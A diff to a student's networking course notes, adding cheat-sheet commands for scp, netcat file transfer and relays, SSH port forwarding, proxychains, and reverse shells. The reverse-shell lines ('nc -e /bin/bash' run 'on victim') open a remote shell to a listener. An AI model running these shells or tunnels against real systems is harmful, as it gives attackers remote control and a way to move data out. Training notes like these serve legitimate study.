@@ -338,9 +338,8 @@ ftp <ip address>
 get <filename>
   will download file to home device
 
-what is happening bro
 
-
+red internet host
 Entry Float IP: 10.50.21.8
 
     Your Network Number is N (Given by Instructor)
@@ -349,10 +348,63 @@ Entry Float IP: 10.50.21.8
 
     X is your student number
 
+scp student@<ip address>:secret.txt /home/student
+  copies from students home directory and brings to your local /home/student
+scp secretstuff.txt student@<ip address>:/home/student
+  uploads secretstuff.txt to student /home/student at <ip address>
+scp -r folder/ student@<ip address>
+  copies whatever is in the folder and sends it to student at <ip address>
+
+scp uses capital P to specify a port to use
+  scp -P
+
+nc -lvp 9001 > newfile.txt
+  listening (sends file)
+nc 172.16.82.106 9001 < file.txt
+  client (recieve file)
+
+mkfifo mypipe 
+nc -lvp 1111 < mypipe | nc -lvp 3333 > mypipe
+  relay
+
+nc 172.16.82.106 1111 < secret.txt
+  send
+
+nc 192.168.1.1 333 > newsecret.txt
+  receive
 
 
+reverse shells
+  nc -lvp 9999
+    listen on your device
+
+  nc -c /bin/bash 10.10.0.40 9999
+    on victim using -c
+
+  nc -e /bin/bash 10.10.0.40 9999
+    on victim using -e
+
+xxd -r <filename> <decoded filename>
 
 ###########################TUNNELS####################################
+need loopback and port specified by tunnel
+
+ssh student@<ip address> -L 1111:127.0.0.1:22 -NT
+  creates local port forward to target device
+
+scp -P 1111 student@127.0.0.1:secretstuff.txt /home/student
+  goes through tunnel created above and copies secretstuff.txt and puts it in /home/student on local box
+#########################################################################################################
+
+ssh student@172.16.82.106 -D 9050 -NT
+  creates a dynamic port forward to target device
+
+proxychains tool allows interaction with dynamic tunnels
+proxychains scp student@127.0.0.1:secretstuff.txt . 
+  downloads file from a remote directory to a local directory
+
+proxychains scp secretstuff.txt student@127.0.0.1
+  uploads file to remote host through tunnel
 
 
 
